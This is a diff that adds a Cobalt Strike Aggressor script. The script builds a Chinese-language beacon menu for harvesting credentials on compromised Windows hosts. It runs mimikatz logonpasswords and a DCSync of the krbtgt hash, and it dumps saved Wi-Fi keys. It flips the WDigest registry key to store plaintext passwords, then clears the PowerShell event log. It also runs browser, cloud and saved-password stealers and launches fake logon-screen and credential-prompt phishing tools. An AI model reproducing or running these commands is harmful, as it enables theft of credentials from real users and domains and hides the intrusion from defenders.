@@ -1,0 +1,217 @@
+menu "密码抓取" {
+  item "logonpasswords" {
+    $bid = $1['@'];
+    bmimikatz($bid, "sekurlsa::logonpasswords");
+  }
+  item "Krbtgt hash" {
+    $bid = $1['@'];
+    $dialog = dialog("Krbtgt NTLM-Hash" , %(domain => "xxx.com" , user => "krbtgt", bid => $bid), &krbtgt);
+    dialog_description($dialog, "利用Mimikatz读取Krbtgt账户的NTLM-Hash。");
+    drow_text($dialog, "domain", "Domain: ");
+  	drow_text($dialog, "user", "User: ");
+    dbutton_action($dialog, "运行");
+    dialog_show($dialog);
+	}
+  sub krbtgt{
+    $domain = $3['domain'];
+    $user = $3['user'];
+	  bmimikatz($bid, "lsadump::dcsync /domain:$domain /user:$user");
+  }
+
+  menu "探测wifi密码" {
+    item "获取连接过的wifi" {
+      local('$bid');
+      foreach $bid ($1){
+        bshell($1, "netsh wlan show profiles");
+      }
+    }
+    item "获取wifi密码" {
+      prompt_text("输入wifi名: ", "", lambda({
+        bshell(@ids, "netsh wlan show profile name=\"$1\" key=clear");
+      }, @ids => $1));
+    }
+    item "SharpWifiGrabber(检索Wi-Fi密码)"{
+      blog($1, "项目地址：https://github.com/r3nhat/SharpWifiGrabber")
+      bexecute_assembly($1, script_resource('/scripts/PassCapture/SharpWifiGrabber.exe'), "");
+    }
+  }
+
+  menu "修改注册表dump明文密码" {
+    item "显示明文" {
+      local('$bid');
+      foreach $bid ($1){
+        bshell($1, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
+      }
+    }
+    item "强制锁屏" {
+      local('$bid');
+      foreach $bid ($1){
+        blog($1, "正在执行锁屏");
+        bpowershell_import($bid, script_resource("/scripts/PassCapture/lock-screen.ps1"));
+        bpowerpick($bid,"Lock-WorkStation");
+        bshell($bid,"wevtutil cl \"Windows PowerShell\"");
+      }
+    }
+    item "隐藏明文" {
+      local('$bid');
+      foreach $bid ($1){
+        bshell($1, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f");
+      }
+    }
+  }
+
+  menu "提取浏览器数据及密码" {
+    item "BrowserGhost(提取浏览器密码)" {
+      blog($1, "项目地址：https://github.com/QAX-A-Team/BrowserGhost")
+      bexecute_assembly($1, script_resource("/scripts/PassCapture/BrowserGhost.exe"));
+    }
+
+    item "SharpChromium(提取浏览器数据)" {
+      $bid = $1['@'];
+      $dialog = dialog("SharpChromium", %(bid => $bid), &SharpChromium);
+      dialog_description($dialog,".NET 4.0 CLR项目，用于检索Chromium数据，如Cookie、历史记录和保存的登录名。项目地址：https://github.com/djhohnstein/SharpChromium");
+      drow_combobox($dialog, "Type", "all/cookies/history/logins", @("all", "cookies","history","logins"));
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);
+    }
+    sub SharpChromium {
+      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpChromium.exe"), $3['Type']);
+    }
+  }
+
+  menu "hack-browser-data" {
+    item "上传hack-browser-data" {
+      $bid = $1;
+      $dialog = dialog("上传 hack-browser-data", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &hack-browser-data);
+      dialog_description($dialog, "全平台支持，软件地址：https://github.com/moonD4rk/HackBrowserData");
+      drow_text($dialog, "UploadPath",  "上传路径: ");
+      dbutton_action($dialog, "上传");
+      dialog_show($dialog);
+    }
+    sub hack-browser-data {
+      bcd($bid, $3['UploadPath']);
+      bupload($bid, script_resource("/scripts/PassCapture/hack-browser-data.exe"));
+      }
+
+    item "运行hack-browser-data"{
+      $bid = $1['@'];
+      $Dialog = dialog("运行hack-browser-data",%(bid => $bid),&hack-browser-data_run);
+      dialog_description($Dialog, "运行后会在当前目录下生成results文件夹，所有结果都在里面");
+      dbutton_action($Dialog, "运行");
+      btask($bid, "运行后会在当前目录下生成results文件夹，所有结果都在里面", "");
+      dialog_show($Dialog);
+      
+    }
+    sub hack-browser-data_run{
+      bshell($bid, "hack-browser-data.exe");
+    }
+
+    item "删除hack-browser-data"{
+      local('$bid');
+      foreach $bid ($1){
+        bshell($1, "del /f /s /q hack-browser-data.exe");
+      }
+    }
+  }
+
+  menu "本地程序文件密码解密" {
+    item "SharpCloud(获取云凭证)" {
+      $bid = $1['@'];
+      $dialog = dialog("获取云凭证", %(bid => $bid), &SharpCloud);
+      dialog_description($dialog, "用于检查是否存在与AWS，Microsoft Azure和Google Compute相关的凭证文件。项目地址：https://github.com/chrismaddalena/SharpCloud");
+      drow_combobox($dialog, "type", "type:", @("all","aws","azure","gcloud"));
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);
+    }
+    sub SharpCloud {
+      $arg = join(' ',  @($3['type']));
+      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpCloud.exe"), $arg);
+    }
+    menu "SharpDecryptPwd(from uknowsec)" {
+      item "SharpDecryptPwd" {
+        $bid = $1['@'];
+        $dialog = dialog("SharpDecryptPwd", %(type => "-NavicatCrypto",bid => $bid), &SharpDecryptPwd);
+        dialog_description($dialog,"对密码已保存在Windwos系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品（Xshell,Xftp)。项目地址：https://github.com/uknowsec/SharpDecryptPwd");
+        drow_combobox($dialog, "type", "Type:", @("-NavicatCrypto", "-TeamViewer", "-FileZilla","-WinSCP"));
+        dbutton_action($dialog, "运行");
+        dialog_show($dialog);
+      }
+      item "Xmangager" {
+        $bid = $1['@'];
+        $dialog = dialog("Xmangager", %(type => "-Xmangager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &Xmangager);
+        dialog_description($dialog, "Xmangager系列产品，如：Xshell,Xftp。");
+        drow_combobox($dialog, "type", "Type:", @("-Xmangager"));
+        drow_text($dialog, "path", "Sessions Path:  ");
+        dbutton_action($dialog, "运行");
+        dialog_show($dialog);
+      }
+    }
+    sub SharpDecryptPwd {
+      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpDecryptPwd.exe"), $3['type']);
+    }
+    sub Xmangager {
+      $arg = join(' ', @($3['type'],"-p",$3['path']));
+      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpDecryptPwd.exe"), $arg);
+    }
+
+    menu "SharpDecryptPwd(from RcoIl)" {
+      item "SharpDecryptPwd40" {
+        $bid = $1['@'];
+        $dialog = dialog("SharpDecryptPwd40", %(type => "-Navicat",bid => $bid), &SharpDecryptPwd40);
+        dialog_description($dialog,"目前支持 Navicat 系列、Xmanager 系列、TeamViewer、FileZilla 客户端、Foxmail、RealVNC 服务端、TortoiseSVN、WinSCP、Chrome 全版本。项目地址：https://github.com/RcoIl/SharpDecryptPwd");
+        drow_combobox($dialog, "type", "Type:", @("-Navicat", "-TeamViewer", "-FileZilla","-WinSCP","-Foxmail","-RealVNC","-TortoiseSVN","-Chrome"));
+        dbutton_action($dialog, "运行");
+        dialog_show($dialog);
+      }
+      item "Xmangager40" {
+        $bid = $1['@'];
+        $dialog = dialog("Xmangager", %(type => "-Xmanager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &Xmangager40);
+        dialog_description($dialog, "Xmangager系列产品，如：Xshell,Xftp。");
+        drow_combobox($dialog, "type", "Type:", @("-Xmanager"));
+        drow_text($dialog, "path", "Sessions Path:  ");
+        dbutton_action($dialog, "运行");
+        dialog_show($dialog);
+      }
+    }
+    sub SharpDecryptPwd40 {
+      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpDecryptPwd40.exe"), $3['type']);
+    }
+    sub Xmangager40 {
+      $arg = join(' ', @($3['type'],"-p",$3['path']));
+      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpDecryptPwd40.exe"), $arg);
+    }
+  }
+
+  item "Net-GPPPassword(组策略帐户凭据)" {
+    blog($1, ".NET实现的Get-GPPPassword。检索通过组策略首选项推送的帐户的明文密码和其他信息。该技术很旧，但是在很早以前创建域的环境中仍然很有用。项目地址：https://github.com/outflanknl/Net-GPPPassword")
+    bexecute_assembly($1, script_resource("/scripts/PassCapture/Net-GPPPassword_dotNET_v2.exe"), "");
+  }
+
+  menu "钓鱼密码窃取" {
+    item "FakeLogonScreen(windows锁屏钓鱼)" {
+      $bid = $1;
+      $dialog = dialog("FakeLogonScreen", %(bid => $bid), &FakeLogonScreen);
+      dialog_description($dialog, "FakeLogonScreen是用于伪造Windows登录屏幕以获取用户密码的实用程序。输入的密码已针对Active Directory或本地计算机进行了验证，以确保密码正确无误，将输出写入控制台和%LOCALAPPDATA%\\Microsoft\\user.db文件中。由于伪造的页面一言难尽，慎用！！！项目地址：https://github.com/bitsadmin/fakelogonscreen");
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);
+    }
+    sub FakeLogonScreen {
+      bexecute_assembly($bid, script_resource("/scripts/PassCapture/FakeLogonScreenToFile.exe"), "");
+    }
+
+    item "CredPhisher(认证登录框钓鱼)" {
+      $bid = $1['@'];
+      $dialog = dialog("CredPhisher", %(content => "安全认证",bid => $bid), &CredPhisher);
+      dialog_description($dialog, "弹出安全认证登录框，进行钓鱼。windows10测试成功。项目地址：https://github.com/matterpreter/OffensiveCSharp/tree/master/CredPhisher");
+      drow_text($dialog, "content", "content:");
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);
+    }
+    sub CredPhisher {
+      $arg = join('',@("",$3['content']));
+      bexecute_assembly($bid, script_resource("/scripts/PassCapture/CredPhisher.exe"), $arg);
+    }
+  }
+
+
+}
